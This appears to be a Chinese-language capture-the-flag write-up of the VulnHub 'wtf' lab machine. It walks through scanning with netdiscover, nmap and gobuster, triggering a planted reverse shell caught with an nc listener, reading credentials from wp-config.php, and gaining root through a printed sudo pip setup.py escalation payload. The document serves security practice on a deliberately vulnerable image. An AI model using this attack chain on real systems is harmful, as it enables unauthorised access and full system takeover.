# vulnhub之wtf的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746358&idx=1&sn=06dfae615cbc5f727507ebb55fadc65c&chksm=87148cf6b06305e0e311047881f5c73f1e81ff9c44a28edebf1f0e658d54d9f71123fdee7190&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746358&idx=1&sn=06dfae615cbc5f727507ebb55fadc65c&chksm=87148cf6b06305e0e311047881f5c73f1e81ff9c44a28edebf1f0e658d54d9f71123fdee7190&scene=27#wechat_redirect)

本周末实践的是vulnhub的wtf镜像，下载地址，https://download.vulnhub.com/wtf/wtf.rar，

用workstation打开，能扫描到地址，

sudo netdiscover -r 192.168.137.0/24，

![](../Images/bb24d16793a79ef94bfb242673f4d4f5.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.137.75，

![](../Images/b743ccc7279c6bf5811ecc1b49931e1a.png)

再接着做目录爆破，这回用的gobuster，

需要先安装，sudo apt install gobuster，

然后还要安装爆破字典，sudo apt -y install seclists，

扫描，sudo gobuster dir --url http://192.168.137.75 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt，

![](../Images/1d89cc6c5031951f38d4ba318c137d37.png)

访问http://192.168.137.75/zhkh/，

![](../Images/800b3c52897ec1395413b636eb14b9a8.png)

查看源码，发现wp-content子目录，

![](../Images/0eaf5e989277ce8f48f38e8678a3a56c.png)

继续扫描，sudo gobuster dir --url http://192.168.137.75/zhkh/wp-content -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt，

![](../Images/d3684f63304125cb7081193006dbc9ec.png)

访问http://192.168.137.75/zhkh/wp-content/uploads/，

![](../Images/5943d4431db59da18e3aff98831e3053.png)

继续访问子目录，

![](../Images/223372808f2eb67a2cab7836f18ce9f6.png)

访问shell.php，并抓包，

![](../Images/8f20c4f3a91e4668abaa1388e6cc1bab.png)

发现反弹shell的接收端是192.168.1.14，端口是5555，

重新部署靶机和kali攻击机，都放到192.168.1.0/24网段里，

且配置kali攻击机的地址为192.168.1.14，靶机dhcp，

重新做地址扫描，sudo netdiscover -r 192.168.1.0/24，

![](../Images/2f08764b85479facfc73423fb1d9def7.png)

访问http://192.168.1.128/zhkh/wp-content/uploads/，

在kali攻击机上开一个监听，sudo nc -nlvp 5555，

然后再次访问shell.php，就拿到了shell，

![](../Images/654f84750efbf83f287bc4db99d8b397.png)

不是root，需要提权，查看文件，

![](../Images/928e9ae473f4cfeaf3e08513a1ab712a.png)

从wp-config.php里查看到有用信息，ra/912391929129，

![](../Images/753a8986a2f38e7688503c2804f9ef9c.png)

以及另一个类似密码的东西，\`Db\]f{He3HgO\`(z，

![](../Images/dee9383631a753767a1711fcde61bebf.png)

发现ra/\`Db\]f{He3HgO\`(z可ssh登录，并且pip是以root权限运行的，

![](../Images/c23de7504d3d0f10ce622f343d61aeff.png)

从https://gtfobins.github.io/gtfobins/pip/上找到提权代码，

TF=$(mktemp -d)  
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py  
sudo pip install $TF

提权成功，

![](../Images/e38dfc9f370d946310946a616deeb863.png)
